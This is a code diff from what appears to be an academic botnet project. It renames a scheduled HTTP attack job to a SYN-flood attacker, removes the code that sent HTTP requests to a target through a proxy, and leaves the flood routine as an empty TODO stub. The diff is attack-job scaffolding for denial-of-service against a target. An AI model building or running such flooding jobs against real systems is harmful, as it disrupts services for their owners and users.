@@ -27,38 +27,33 @@
 package com.acmutv.botnet.core.attack;
 
 import com.acmutv.botnet.log.AppLogMarkers;
-import com.acmutv.botnet.tool.net.HttpManager;
-import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import lombok.*;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.quartz.*;
 
-import java.io.IOException;
 import java.net.URL;
-import java.util.Map;
 
 /**
  * A HTTP attack that can be executed by a {@link Scheduler}.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see HttpAttack
+ * @see SynFloodAttack
  */
 @Getter
 @PersistJobDataAfterExecution
 @DisallowConcurrentExecution
-public class HttpAttacker implements QuartzAttacker {
+public class SynFloodAttacker implements QuartzAttacker {
 
-  private static final Logger LOGGER = LogManager.getLogger(HttpAttacker.class);
+  private static final Logger LOGGER = LogManager.getLogger(SynFloodAttacker.class);
 
   @Override
   public void execute(JobExecutionContext context) throws JobExecutionException {
     LOGGER.traceEntry();
     JobDataMap jobmap = context.getJobDetail().getJobDataMap();
     LOGGER.trace("With jobmap {}", jobmap);
-    final HttpMethod method = (HttpMethod) jobmap.get("method");
     final URL target = (URL) jobmap.get("target");
     final HttpProxy proxy = (HttpProxy) jobmap.get("proxy");
     final int counter = (int)jobmap.getOrDefault("counter", 1);
@@ -69,14 +64,13 @@ public class HttpAttacker implements QuartzAttacker {
     LOGGER.trace("Execution {}", counter);
 
     LOGGER.info(AppLogMarkers.ATTACK,
-        "Launching HTTP attack: {} {} ({}/{}) behind proxy {}",
-        method, target, counter, executions, (proxy == null)?"none":proxy.toCompactString());
+        "Launching SYN-FLOOD attack: {} {} ({}/{}) behind proxy {}",
+        target, counter, executions, (proxy == null)?"none":proxy.toCompactString());
 
-    try {
-      final int response = HttpManager.makeRequest(method, target, proxy);
-      LOGGER.trace("HTTP Attack response :: {} {} :: {}", method, target, response);
-    } catch (IOException exc) {
-      LOGGER.warn(exc.getMessage());
-    }
+    this.makeSynFloodAttack(target, proxy);
+  }
+
+  private void makeSynFloodAttack(URL target, HttpProxy proxy) {
+    //TODO
   }
 }
